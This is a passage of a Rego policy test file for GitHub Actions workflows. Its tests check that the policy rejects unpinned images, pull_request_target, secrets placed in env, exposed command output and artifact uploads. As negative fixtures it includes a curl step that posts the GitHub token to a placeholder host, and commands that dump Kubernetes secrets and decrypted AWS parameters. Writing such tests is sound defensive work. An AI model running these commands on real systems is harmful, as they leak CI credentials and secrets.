		"ghcr.io/example/service@sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
	)
	some msg in violations
	contains(msg, "container image")
}

test_rejects_mutable_service_image if {
	violations := deny with input as workflow_with_images(
		"docker://alpine@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
		"ghcr.io/example/job@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
		"ghcr.io/example/service:latest",
	)
	some msg in violations
	contains(msg, "service")
}

test_allows_digest_pinned_workflow_images if {
	violations := deny with input as workflow_with_images(
		"docker://alpine@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
		"ghcr.io/example/job@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
		"ghcr.io/example/service@sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
	)
	count(violations) == 0
}

test_rejects_generic_pull_request_target_workflow if {
	workflow := object.union(workflow_with_live_run("echo safe"), {"on": "pull_request_target"})
	violations := deny with input as workflow
	some msg in violations
	contains(msg, "must not use pull_request_target")
}

test_allows_exact_native_receipt_provenance_workflow if {
	violations := deny with input as native_receipt_provenance_fixture
	count(violations) == 0
}

test_rejects_native_receipt_provenance_with_canceling_concurrency if {
	workflow := object.union(native_receipt_provenance_fixture, {"concurrency": {"group": "native-chainguard-receipt-provenance", "cancel-in-progress": true}})
	violations := deny with input as workflow
	some msg in violations
	contains(msg, "must not use pull_request_target")
}

test_rejects_native_receipt_provenance_with_write_permission if {
	base := native_receipt_provenance_fixture
	workflow := object.union(base, {"jobs": {"verify": object.union(base.jobs.verify, {
		"permissions": {"actions": "read", "contents": "write"},
	})}})
	violations := deny with input as workflow
	some msg in violations
	contains(msg, "must not use pull_request_target")
}

test_rejects_native_receipt_provenance_with_changed_verifier_step if {
	base := native_receipt_provenance_fixture
	steps := [
		base.jobs.verify.steps[0],
		object.union(base.jobs.verify.steps[1], {"run": "echo \"$GH_TOKEN\""}),
	]
	workflow := object.union(base, {"jobs": {"verify": object.union(base.jobs.verify, {"steps": steps})}})
	violations := deny with input as workflow
	some msg in violations
	contains(msg, "must not use pull_request_target")
}

test_rejects_native_receipt_provenance_with_extra_step if {
	base := native_receipt_provenance_fixture
	steps := array.concat(base.jobs.verify.steps, [{"run": "curl --data '${{ github.token }}' https://example.invalid"}])
	workflow := object.union(base, {"jobs": {"verify": object.union(base.jobs.verify, {"steps": steps})}})
	violations := deny with input as workflow
	some msg in violations
	contains(msg, "must not use pull_request_target")
}

test_rejects_native_receipt_provenance_with_head_checkout if {
	base := native_receipt_provenance_fixture
	checkout := object.union(base.jobs.verify.steps[0], {"with": object.union(
		base.jobs.verify.steps[0].with,
		{"ref": "${{ github.event.pull_request.head.sha }}"},
	)})
	workflow := object.union(base, {"jobs": {"verify": object.union(
		base.jobs.verify,
		{"steps": [checkout, base.jobs.verify.steps[1]]},
	)}})
	violations := deny with input as workflow
	some msg in violations
	contains(msg, "must not use pull_request_target")
}

test_rejects_public_live_command_output if {
	violations := deny with input as workflow_with_live_run("bash scripts/ci/install-kubeconfig.sh")
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_rejects_dot_slash_live_command_output if {
	violations := deny with input as workflow_with_live_run("./scripts/ci/install-kubeconfig.sh")
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_rejects_direct_kubectl_output if {
	violations := deny with input as workflow_with_live_run("kubectl get secrets --all-namespaces -o yaml")
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_rejects_direct_aws_output if {
	violations := deny with input as workflow_with_live_run("aws ssm get-parameter --with-decryption --name example")
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_rejects_direct_octeliumctl_output if {
	violations := deny with input as workflow_with_live_run("octeliumctl get services -o json")
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_rejects_direct_terragrunt_state_output if {
	violations := deny with input as workflow_with_live_run("terragrunt output -json")
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_rejects_direct_tofu_state_output if {
	violations := deny with input as workflow_with_live_run("tofu show -json plan.out")
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_rejects_quoted_terragrunt_state_output if {
	violations := deny with input as workflow_with_live_run(`"terragrunt" output -json`)
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_rejects_dynamic_executable if {
	violations := deny with input as workflow_with_live_run(`${TG:-tofu} show -json plan.out`)
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_rejects_nix_wrapped_dynamic_executable if {
	violations := deny with input as workflow_with_live_run(`nix develop --command "$TG" show -json plan.out`)
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_rejects_workflow_scoped_secret_env if {
	violations := deny with input as {
		"name": "unsafe root env",
		"on":   "push",
		"permissions": {},
		"env": {"TOKEN": "${{secrets.OCTELIUM_CI_AUTH_TOKEN}}"},
		"jobs": {
			"test": {
				"runs-on":    "ubuntu-24.04",
				"permissions": {},
				"steps":       [{"run": "true"}],
			},
		},
	}
	some msg in violations
	contains(msg, "workflow-level environment variable")
}

test_rejects_job_scoped_github_token_env if {
	violations := deny with input as {
		"name": "unsafe job env",
		"on":   "push",
		"permissions": {},
		"jobs": {
			"test": {
				"runs-on":    "ubuntu-24.04",
				"permissions": {},
				"env":         {"TOKEN": "${{github.token}}"},
				"steps":       [{"run": "true"}],
			},
		},
	}
	some msg in violations
	contains(msg, "workflow job")
}

test_rejects_mixed_case_workflow_scoped_secret_env if {
	violations := deny with input as {
		"name":        "unsafe mixed-case root env",
		"on":          "push",
		"permissions": {},
		"env":         {"TOKEN": "${{ SECRETS [ 'NAME' ] }}"},
		"jobs": {
			"test": {
				"runs-on":     "ubuntu-24.04",
				"permissions": {},
				"steps":       [{"run": "true"}],
			},
		},
	}
	some msg in violations
	contains(msg, "workflow-level environment variable")
}

test_rejects_mixed_case_job_scoped_github_token_env if {
	violations := deny with input as {
		"name":        "unsafe mixed-case job env",
		"on":          "push",
		"permissions": {},
		"jobs": {
			"test": {
				"runs-on":     "ubuntu-24.04",
				"permissions": {},
				"env":         {"TOKEN": "${{ GITHUB [ 'token' ] }}"},
				"steps":       [{"run": "true"}],
			},
		},
	}
	some msg in violations
	contains(msg, "workflow job")
}

test_rejects_serialized_github_context_in_job_env if {
	violations := deny with input as {
		"name":        "unsafe serialized github context",
		"on":          "push",
		"permissions": {},
		"jobs": {
			"test": {
				"runs-on":     "ubuntu-24.04",
				"permissions": {},
				"env":         {"CONTEXT": "${{ toJSON(GITHUB.*) }}"},
				"steps":       [{"run": "true"}],
			},
		},
	}
	some msg in violations
	contains(msg, "workflow job")
}

test_rejects_joined_github_context_in_job_env if {
	violations := deny with input as {
		"name":        "unsafe joined github context",
		"on":          "push",
		"permissions": {},
		"jobs": {
			"test": {
				"runs-on":     "ubuntu-24.04",
				"permissions": {},
				"env":         {"CONTEXT": "${{ join(GITHUB.*, ',') }}"},
				"steps":       [{"run": "true"}],
			},
		},
	}
	some msg in violations
	contains(msg, "workflow job")
}

test_rejects_credentials_after_expression_braces if {
	every value in [
		"${{ format('}}{0}', github.token) }}",
		"${{ format('}}{0}', secrets.NAME) }}",
	] {
		violations := deny with input as {
			"name":        "unsafe embedded braces",
			"on":          "push",
			"permissions": {},
			"env":         {"TOKEN": value},
			"jobs": {
				"test": {
					"runs-on":     "ubuntu-24.04",
					"permissions": {},
					"steps":       [{"run": "true"}],
				},
			},
		}
		some msg in violations
		contains(msg, "workflow-level environment variable")
	}
}

test_allows_unrelated_variable_name_containing_github if {
	violations := deny with input as {
		"name":        "safe variable name",
		"on":          "push",
		"permissions": {},
		"env":         {"REPOSITORY": "${{ vars.MY_GITHUB }}"},
		"jobs": {
			"test": {
				"runs-on":     "ubuntu-24.04",
				"permissions": {},
				"steps":       [{"run": "true"}],
			},
		},
	}
	count(violations) == 0
}

test_allows_local_terragrunt_validation if {
	violations := deny with input as workflow_with_live_run("nix develop --command terragrunt hcl validate")
	count(violations) == 0
}

test_allows_local_helm_render if {
	violations := deny with input as workflow_with_live_run("helm template example ./chart >/dev/null")
	count(violations) == 0
}

test_allows_local_kustomize_output if {
	violations := deny with input as workflow_with_live_run("kubectl kustomize clusters/homelab/apps/example >/dev/null")
	count(violations) == 0
}

test_rejects_comment_only_privacy_markers if {
	violations := deny with input as workflow_with_live_run(`# umask 077
# trap 'rm -f "$private_log"' EXIT
# >"$private_log" 2>&1
# echo "details withheld"
bash scripts/ci/install-kubeconfig.sh`)
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_rejects_unrelated_private_redirection if {
	violations := deny with input as workflow_with_live_run(`private_log="$(mktemp)"
trap 'rm -f "$private_log"' EXIT
umask 077
echo dummy >"$private_log" 2>&1
bash scripts/ci/install-kubeconfig.sh
echo "details withheld"`)
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_rejects_private_log_reprint if {
	run := sprintf("%s\ncat \"$private_log\"", [withheld_live_run])
	violations := deny with input as workflow_with_live_run(run)
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_allows_exact_plan_stage_classifier if {
	violations := deny with input as workflow_with_live_run(classified_live_run)
	count(violations) == 0
}

test_allows_exact_azuread_plan_stage_classifier if {
	violations := deny with input as workflow_with_live_run(classified_azuread_live_run)
	count(violations) == 0
}

test_rejects_modified_azuread_plan_private_wrapper if {
	every run in [
		replace(classified_azuread_live_run, `private_dir="$(mktemp -d)"`, `private_dir="$(mktemp)"`),
		replace(classified_azuread_live_run, `chmod 700 "$private_dir"`, `chmod 777 "$private_dir"`),
		replace(classified_azuread_live_run, `azuread_report="$private_dir/azuread-report.json"`, `azuread_report="$RUNNER_TEMP/report.json"`),
		replace(classified_azuread_live_run, `azuread_report="$private_dir/azuread-report.json"`, "azuread_report=\"$private_dir/azuread-report.json\"\nazuread_report=\"$RUNNER_TEMP/report.json\""),
		replace(classified_azuread_live_run, `trap 'rm -rf -- "$private_dir"' EXIT`, `trap 'rm -f "$private_log"' EXIT`),
		replace(classified_azuread_live_run, `if ! HOMELAB_AZUREAD_PLAN_REPORT_FILE="$azuread_report" nix develop`, `if ! nix develop`),
	] {
		violations := deny with input as workflow_with_live_run(run)
		some msg in violations
		contains(msg, "withhold sensitive command output")
	}
}

test_rejects_modified_azuread_plan_stage_classifier if {
	every replacement in [
		`bash scripts/ci/terragrunt-plan-stage.sh <"$private_log"`,
		`HOMELAB_AZUREAD_PLAN_REPORT_FILE="$other_report" bash scripts/ci/terragrunt-plan-stage.sh <"$private_log"`,
		`HOMELAB_AZUREAD_PLAN_REPORT_FILE="${azuread_report:-}" bash scripts/ci/other.sh <"$private_log"`,
		`HOMELAB_AZUREAD_PLAN_REPORT_FILE="${azuread_report:-}" bash scripts/ci/terragrunt-plan-stage.sh <"$private_log"; cat "$azuread_report"`,
	] {
		run := replace(classified_azuread_live_run, azuread_plan_stage_call, replacement)
		violations := deny with input as workflow_with_live_run(run)
		some msg in violations
		contains(msg, "withhold sensitive command output")
	}
}

test_allows_exact_apply_stage_classifier if {
	violations := deny with input as workflow_with_live_run(classified_apply_run)
	count(violations) == 0
}

test_rejects_unverified_plan_stage_classifier if {
	run := replace(withheld_live_run, "\nthen\n", sprintf("\nthen\n  %s\n", [plan_stage_call]))
	violations := deny with input as workflow_with_live_run(run)
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_rejects_unverified_apply_stage_classifier if {
	run := replace(withheld_live_run, "\nthen\n", sprintf("\nthen\n  %s\n", [apply_stage_call]))
	violations := deny with input as workflow_with_live_run(run)
	some msg in violations
	contains(msg, "withhold sensitive command output")
}

test_rejects_modified_plan_stage_guard if {
	every replacement in [
		replace(plan_stage_guard, "aed6c96d6e74935108029cc3ee115bd68e1e4f8ca381380d413d67198c2fb15c", "0000000000000000000000000000000000000000000000000000000000000000"),
		replace(plan_stage_guard, "sha256sum --check --status", "true"),
		replace(plan_stage_guard, "sha256sum", "shasum"),
		replace(plan_stage_guard, "if sha256sum", "if ! sha256sum"),
		replace(plan_stage_guard, " --check", ""),
		replace(plan_stage_guard, " --status", ""),
		replace(plan_stage_guard, "stage.sh", "other.sh"),
		replace(plan_stage_guard, " 2>/dev/null", ""),
		replace(plan_stage_guard, "; then", " || true; then"),
		sprintf("%s\n  echo extra", [plan_stage_guard]),
	] {
		run := replace(classified_live_run, plan_stage_guard, replacement)
		violations := deny with input as workflow_with_live_run(run)
		some msg in violations
		contains(msg, "withhold sensitive command output")
	}
}

test_rejects_modified_plan_stage_classifier if {
	every replacement in [
		`sh scripts/ci/terragrunt-plan-stage.sh <"$private_log"`,
		`bash scripts/ci/other.sh <"$private_log"`,
		`bash ./scripts/ci/terragrunt-plan-stage.sh <"$private_log"`,
		`bash scripts/ci/terragrunt-plan-stage.sh --verbose <"$private_log"`,
		`bash scripts/ci/terragrunt-plan-stage.sh "$private_log"`,
		`bash scripts/ci/terragrunt-plan-stage.sh <"$other_log"`,
		`bash scripts/ci/terragrunt-plan-stage.sh <"$private_log"; cat "$private_log"`,
		`cat "$private_log"`,
		`echo "$private_log details withheld"`,
		`echo "$line details withheld"`,
		sprintf("%s\n  echo extra", [plan_stage_call]),
	] {
		run := replace(classified_live_run, plan_stage_call, replacement)
		violations := deny with input as workflow_with_live_run(run)
		some msg in violations
		contains(msg, "withhold sensitive command output")
	}
}

test_rejects_modified_apply_stage_guard if {
	every replacement in [
		replace(apply_stage_guard, "a6cbd46213ab38cdae557b56cb1e763ea7d0fdef6fa6ff7b9e071b582f51f865", "0000000000000000000000000000000000000000000000000000000000000000"),
		replace(apply_stage_guard, "sha256sum --check --status", "true"),
		replace(apply_stage_guard, "sha256sum", "shasum"),
		replace(apply_stage_guard, "if sha256sum", "if ! sha256sum"),
		replace(apply_stage_guard, " --check", ""),
		replace(apply_stage_guard, " --status", ""),
		replace(apply_stage_guard, "stage.sh", "other.sh"),
		replace(apply_stage_guard, " 2>/dev/null", ""),
		replace(apply_stage_guard, "; then", " || true; then"),
		sprintf("%s\n  echo extra", [apply_stage_guard]),
	] {
		run := replace(classified_apply_run, apply_stage_guard, replacement)
		violations := deny with input as workflow_with_live_run(run)
		some msg in violations
		contains(msg, "withhold sensitive command output")
	}
}

test_rejects_modified_apply_stage_classifier if {
	every replacement in [
		`sh scripts/ci/terragrunt-apply-stage.sh <"$private_log"`,
		`bash scripts/ci/other.sh <"$private_log"`,
		`bash ./scripts/ci/terragrunt-apply-stage.sh <"$private_log"`,
		`bash scripts/ci/terragrunt-apply-stage.sh --verbose <"$private_log"`,
		`bash scripts/ci/terragrunt-apply-stage.sh "$private_log"`,
		`bash scripts/ci/terragrunt-apply-stage.sh <"$other_log"`,
		`bash scripts/ci/terragrunt-apply-stage.sh <"$private_log"; cat "$private_log"`,
		`cat "$private_log"`,
		`echo "$private_log details withheld"`,
		`echo "$line details withheld"`,
		sprintf("%s\n  echo extra", [apply_stage_call]),
	] {
		run := replace(classified_apply_run, apply_stage_call, replacement)
		violations := deny with input as workflow_with_live_run(run)
		some msg in violations
		contains(msg, "withhold sensitive command output")
	}
}

test_allows_exact_harbor_mirror_status if {
	violations := deny with input as workflow_with_live_run(harbor_mirror_private_run)
	count(violations) == 0
}

test_rejects_modified_harbor_mirror_status if {
	every run in [
		replace(harbor_mirror_private_run, `cat "$public_status"`, `cat "$private_log"`),
		replace(harbor_mirror_private_run, `cat "$public_status"`, `cat "$public_status"; cat "$private_log"`),
		replace(harbor_mirror_private_run, "$RUNNER_TEMP/harbor-mirror-status", "$RUNNER_TEMP/other-status"),
		replace(harbor_mirror_private_run, `rm -f "$public_status"`, "true"),
		replace(harbor_mirror_private_run, `trap 'rm -f "$private_log" "$public_status"' EXIT`, `trap 'rm -f "$private_log"' EXIT`),
		replace(harbor_mirror_private_run, "sha256sum --check --status", "true"),
		replace(harbor_mirror_private_run, "&& sha256sum", "|| sha256sum"),
		replace(harbor_mirror_private_run, "0febfbc3f20f53a529ea2a83c451432bcdc20e76c82fae4a03bf307c85d6cef3", "0000000000000000000000000000000000000000000000000000000000000000"),
		replace(harbor_mirror_private_run, "scripts/ci/harbor-publish.sh'", "scripts/ci/other.sh'"),
		replace(harbor_mirror_private_run, "harbor-publish.sh mirror", "harbor-publish.sh publish"),
		replace(harbor_mirror_private_run, "harbor-publish.sh mirror-dns", "harbor-publish.sh mirror-other"),
		replace(harbor_mirror_private_run, "harbor-publish.sh mirror-litellm", "harbor-publish.sh mirror-other"),
		replace(harbor_mirror_private_run, "harbor-publish.sh mirror-prometheus", "harbor-publish.sh mirror-other"),
		replace(harbor_mirror_private_run, `>"$private_log" 2>&1`, ""),
		replace(harbor_mirror_private_run, "umask 077", "umask 022"),
		sprintf("%s\necho extra", [harbor_mirror_private_run]),
	] {
		violations := deny with input as workflow_with_live_run(run)
		some msg in violations
		contains(msg, "withhold sensitive command output")
	}
}

test_rejects_wrapped_live_command_and_write_all if {
	base := workflow_with_live_run("nix develop --command bash scripts/ci/install-kubeconfig.sh")
	workflow := object.union(base, {"jobs": {"test": object.union(base.jobs.test, {
		"permissions": "write-all",
		"steps": array.concat(base.jobs.test.steps, [{"uses": "actions/upload-artifact@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}]),
	})}})
	violations := deny with input as workflow
	some msg in violations
	contains(msg, "withhold sensitive command output")
	some permission_msg in violations
	contains(permission_msg, "write-all")
	some artifact_msg in violations
	contains(artifact_msg, "must not upload artifacts")
}

test_rejects_live_job_public_write_permission if {
	base := workflow_with_live_run(withheld_live_run)
	workflow := object.union(base, {"jobs": {"test": object.union(base.jobs.test, {
		"permissions": {"pull-requests": "write", "id-token": "write"},
	})}})
	violations := deny with input as workflow
	some msg in violations
	contains(msg, "pull-requests")
}

test_rejects_workflow_wide_write_permission if {
	workflow := object.union(workflow_with_live_run("echo safe"), {
		"permissions": {"pull-requests": "write"},
	})
	violations := deny with input as workflow
	some msg in violations
	contains(msg, "workflow-wide")
}

test_rejects_live_job_artifact_upload if {
	every action in ["actions/upload-artifact", "chainguard-actions/actions-upload-artifact"] {
		base := workflow_with_live_run(withheld_live_run)
		workflow := object.union(base, {"jobs": {"test": object.union(base.jobs.test, {
			"steps": array.concat(base.jobs.test.steps, [{"uses": sprintf("%s@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", [action])}]),
		})}})
		violations := deny with input as workflow
		some msg in violations
		contains(msg, "must not upload artifacts")
	}
}

test_allows_exact_native_receipt_artifact if {
	violations := deny with input as workflow_with_native_receipt_artifact(native_receipt_artifact_fixture)
	count(violations) == 0
}

test_rejects_modified_native_receipt_artifact if {
	options := object.union(object.get(native_receipt_artifact_fixture, "with", {}), {
		"path": "${{ runner.temp }}/other.json",
	})
	artifact := object.union(native_receipt_artifact_fixture, {"with": options})
	violations := deny with input as workflow_with_native_receipt_artifact(artifact)
	some msg in violations
	contains(msg, "must not upload artifacts")
}

test_rejects_intervening_native_receipt_step if {
	workflow := workflow_with_native_receipt_artifact(native_receipt_artifact_fixture)
	job := workflow.jobs.receipt
	steps := [job.steps[0], {"run": "echo unsafe > $RUNNER_TEMP/harbor-native-chainguard-receipt.json"}, job.steps[1]]
	changed := object.union(workflow, {"jobs": {"receipt": object.union(job, {"steps": steps})}})
	violations := deny with input as changed
	some msg in violations
	contains(msg, "must not upload artifacts")
}

test_allows_withheld_live_command_output if {
	violations := deny with input as workflow_with_live_run(withheld_live_run)
	count(violations) == 0
}

test_rejects_octelium_catalog_without_one_use_credential if {
	violations := deny with input as workflow_with_catalog_run({})
	some msg in violations
	contains(msg, "must use its one-use catalog credential")
}

test_allows_one_use_octelium_catalog_with_private_output if {
	violations := deny with input as workflow_with_catalog_run({
		"OCTELIUM_CATALOG_AUTH_TOKEN": "test",
	})
	count(violations) == 0
}

test_rejects_octelium_catalog_credential_on_different_step if {
	violations := deny with input as workflow_with_catalog_credential_on_different_step
	some msg in violations
	contains(msg, "must use its one-use catalog credential")
}

withheld_live_run := `private_log="$(mktemp)"
trap 'rm -f "$private_log"' EXIT
if ! nix develop --command bash >"$private_log" 2>&1 <<'EOF'
umask 077
bash scripts/ci/install-kubeconfig.sh
EOF
then
  echo "failure details withheld"
  exit 1
fi
echo "success details withheld"`

plan_stage_call := `bash scripts/ci/terragrunt-plan-stage.sh <"$private_log"`

plan_stage_guard := `if sha256sum --check --status <<<'aed6c96d6e74935108029cc3ee115bd68e1e4f8ca381380d413d67198c2fb15c  scripts/ci/terragrunt-plan-stage.sh' 2>/dev/null; then`

classified_live_run := replace(withheld_live_run, "\nthen\n", sprintf("\nthen\n  %s\n    %s\n  fi\n", [plan_stage_guard, plan_stage_call]))

azuread_plan_stage_call := `HOMELAB_AZUREAD_PLAN_REPORT_FILE="${azuread_report:-}" bash scripts/ci/terragrunt-plan-stage.sh <"$private_log"`

azuread_plan_stage_guard := `if sha256sum --check --status <<<'16be86dcc7b37efa6de69d01d093e8d866bf50f2af8f43258f5a17d45f67ecc0  scripts/ci/terragrunt-plan-stage.sh' 2>/dev/null; then`

azuread_private_live_run := `private_dir="$(mktemp -d)"
chmod 700 "$private_dir"
private_log="$private_dir/plan.log"
azuread_report="$private_dir/azuread-report.json"
trap 'rm -rf -- "$private_dir"' EXIT
if ! HOMELAB_AZUREAD_PLAN_REPORT_FILE="$azuread_report" nix develop --command bash >"$private_log" 2>&1 <<'EOF'
umask 077
bash scripts/ci/install-kubeconfig.sh
EOF
then
  echo "failure details withheld"
  exit 1
fi
echo "success details withheld"`

classified_azuread_live_run := replace(azuread_private_live_run, "\nthen\n", sprintf("\nthen\n  %s\n    %s\n  fi\n", [azuread_plan_stage_guard, azuread_plan_stage_call]))

apply_stage_call := `bash scripts/ci/terragrunt-apply-stage.sh <"$private_log"`

apply_stage_guard := `if sha256sum --check --status <<<'a6cbd46213ab38cdae557b56cb1e763ea7d0fdef6fa6ff7b9e071b582f51f865  scripts/ci/terragrunt-apply-stage.sh' 2>/dev/null; then`

classified_apply_run := replace(withheld_live_run, "\nthen\n", sprintf("\nthen\n  %s\n    %s\n  fi\n", [apply_stage_guard, apply_stage_call]))

withheld_catalog_run := `private_log="$(mktemp)"
trap 'rm -f "$private_log"' EXIT
if ! nix develop --command bash >"$private_log" 2>&1 <<'EOF'
umask 077
bash scripts/ci/octelium-private-kubernetes-apply.sh
EOF
then
  echo "failure details withheld"
  exit 1
fi
echo "success details withheld"`

workflow_with_images(docker_action, job_container, service_image) := {
	"name": "Container pinning test",
	"on": "push",
	"jobs": {"test": {
		"runs-on": "ubuntu-latest",
		"container": job_container,
		"services": {"database": {"image": service_image}},
		"steps": [{"uses": docker_action}],
	}},
}

native_receipt_provenance_fixture := {
	"name": "Verify Native Chainguard Receipt Provenance",
	"concurrency": {"group": "native-chainguard-receipt-provenance", "cancel-in-progress": false},
	"true": {
		"push": {"branches": ["main"]},
		"pull_request_target": {"branches": ["main"], "types": ["opened", "reopened", "synchronize", "edited"]},
	},
	"permissions": {},
	"jobs": {"verify": native_receipt_provenance_job},
}

workflow_with_live_run(run) := {
	"name": "Live output test",
	"on": "workflow_dispatch",
	"env": {"KUBE_API_SERVER_URL": "https://kubernetes-api-ci.stinkyboi.com"},
	"jobs": {"test": {
		"runs-on": "ubuntu-latest",
		"steps": [{"run": run, "env": {"OCTELIUM_AUTH_TOKEN": "test"}}],
	}},
}

workflow_with_catalog_run(env) := {
	"name":        "Octelium catalog test",
	"on":          "workflow_dispatch",
	"permissions": {},
	"jobs": {"test": {
		"runs-on":     "ubuntu-latest",
		"permissions": {"contents": "read"},
		"steps":       [{"run": withheld_catalog_run, "env": env}],
	}},
}

workflow_with_catalog_credential_on_different_step := {
	"name":        "Octelium catalog test",
	"on":          "workflow_dispatch",
	"permissions": {},
	"jobs": {"test": {
		"runs-on":     "ubuntu-latest",
		"permissions": {"contents": "read"},
		"steps": [
			{"run": withheld_catalog_run},
			{"run": "true", "env": {"OCTELIUM_CATALOG_AUTH_TOKEN": "test"}},
		],
	}},
}

test_encrypted_harbor_artifact_exception_is_exact if {
	base := workflow_with_live_run(harbor_mirror_private_run)
	job := object.union(base.jobs.test, {"steps": array.concat(base.jobs.test.steps, [harbor_encrypted_diagnostic_step])})
	workflow := object.union(base, {"jobs": {"mirror": job}})
	violations := deny with input as workflow
	count(violations) == 0
	every changed in [
		object.union(harbor_encrypted_diagnostic_step, {"with": object.union(harbor_encrypted_diagnostic_step.with, {"path": "${{ runner.temp }}/*"})}),
		object.union(harbor_encrypted_diagnostic_step, {"with": object.union(harbor_encrypted_diagnostic_step.with, {"retention-days": 2})}),
		object.union(harbor_encrypted_diagnostic_step, {"if": "always()"}),
	] {
		bad_job := object.union(job, {"steps": array.concat(base.jobs.test.steps, [changed])})
		bad := object.union(base, {"jobs": {"mirror": bad_job}})
		denials := deny with input as bad
		some msg in denials
		contains(msg, "must not upload artifacts")
	}
}

native_receipt_artifact_fixture := {
	"name": "Upload Native Receipt",
	"uses": "chainguard-actions/actions-upload-artifact@ebf8f2543b7189e9a67dcac1af8cabbc5d7a3fd6",
	"with": {
		"name": "harbor-native-chainguard-receipt-${{ github.sha }}",
		"path": "${{ runner.temp }}/harbor-native-chainguard-receipt.json",
		"if-no-files-found": "error",
		"retention-days": 30,
		"include-hidden-files": false,
	},
}

workflow_with_native_receipt_artifact(artifact) := {
	"name": "Verify Native Chainguard Harbor Imports",
	"on": "workflow_dispatch",
	"permissions": {},
	"env": {"KUBE_API_SERVER_URL": "https://kubernetes-api-ci.stinkyboi.com"},
	"jobs": {"receipt": {
		"runs-on": "ubuntu-24.04",
		"permissions": {"contents": "read", "id-token": "write"},
		"steps": [
			{"run": native_receipt_private_run, "env": {"OCTELIUM_AUTH_TOKEN": "test"}},
			artifact,
		],
	}},
}

test_encrypted_oce_image_artifact_exception_is_exact if {
	base := workflow_with_live_run(oce_image_private_run)
	job := object.union(base.jobs.test, {"steps": array.concat(base.jobs.test.steps, [oce_encrypted_diagnostic_step])})
	workflow := object.union(base, {"jobs": {"publish": job}})
	violations := deny with input as workflow
	count(violations) == 0
	every changed in [
		object.union(oce_encrypted_diagnostic_step, {"with": object.union(oce_encrypted_diagnostic_step.with, {"path": "${{ runner.temp }}/*"})}),
		object.union(oce_encrypted_diagnostic_step, {"with": object.union(oce_encrypted_diagnostic_step.with, {"retention-days": 2})}),
		object.union(oce_encrypted_diagnostic_step, {"if": "always()"}),
	] {
		bad_job := object.union(job, {"steps": array.concat(base.jobs.test.steps, [changed])})
		bad := object.union(base, {"jobs": {"publish": bad_job}})
		denials := deny with input as bad
		some msg in denials
		contains(msg, "must not upload artifacts")
	}
	forged_run := replace(oce_image_private_run, "harbor-encrypt-diagnostic.py", "cat")
	forged_job := object.union(job, {"steps": [{"run": forged_run}, oce_encrypted_diagnostic_step]})
	forged := object.union(base, {"jobs": {"publish": forged_job}})
	forged_denials := deny with input as forged
	count(forged_denials) > 0
	forged_phase_run := replace(oce_image_private_run, "phase=unclassified", "cat \"$private_log\"")
	forged_phase_job := object.union(job, {"steps": [{"run": forged_phase_run}, oce_encrypted_diagnostic_step]})
	forged_phase := object.union(base, {"jobs": {"publish": forged_phase_job}})
	forged_phase_denials := deny with input as forged_phase
	count(forged_phase_denials) > 0
}

with_job_run_defaults(workflow, job_name) := candidate if {
	job := object.union(workflow.jobs[job_name], {"defaults": {"run": {"shell": "python"}}})
	candidate := object.union(workflow, {"jobs": object.union(workflow.jobs, {job_name: job})})
}

with_job_run_env(workflow, job_name, env) := candidate if {
	job := object.union(workflow.jobs[job_name], {"env": env})
	candidate := object.union(workflow, {"jobs": object.union(workflow.jobs, {job_name: job})})
}

with_step_run_env(workflow, job_name, index, env) := candidate if {
	step := workflow.jobs[job_name].steps[index]
	merged_env := object.union(object.get(step, "env", {}), env)
	candidate := with_step_run_setting(workflow, job_name, index, {"env": merged_env})
}

with_step_run_setting(workflow, job_name, index, setting) := candidate if {
	steps := workflow.jobs[job_name].steps
	changed := object.union(steps[index], setting)
	updated := array.concat(
		array.concat(array.slice(steps, 0, index), [changed]),
		array.slice(steps, index + 1, count(steps)),
	)
	job := object.union(workflow.jobs[job_name], {"steps": updated})
	candidate := object.union(workflow, {"jobs": object.union(workflow.jobs, {job_name: job})})
}
